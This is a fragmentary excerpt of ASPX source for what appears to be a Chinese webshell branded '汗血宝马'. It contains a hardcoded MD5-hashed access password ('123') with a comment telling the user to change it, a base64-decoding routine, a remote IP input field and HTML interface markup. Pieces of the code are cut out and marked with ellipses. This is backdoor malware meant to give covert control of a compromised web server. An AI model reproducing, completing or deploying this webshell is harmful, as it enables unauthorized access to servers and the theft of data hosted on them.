...
public string Password="202cb962ac59075b964b07152d234b70";//密码123  在此修改密码 注意一定要用md5加密后的密码
...
public void DJvs()
{
    pbzw = Encoding.Default.GetString(Convert.FromBase64String(pbzw));
...
<tr class="head">
<td ><span style="float:right;"><a href="#" target="_blank">专版aspx汗血宝马</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<td style="width:20%" align="left">远程Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="#"/></td>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#003300;">Copyright © 2013-2015 <a href="#" target="_blank">s</a><a 
        href="#">x</a> All Rights Reserved.</div></div>
</form>
</body>
</html>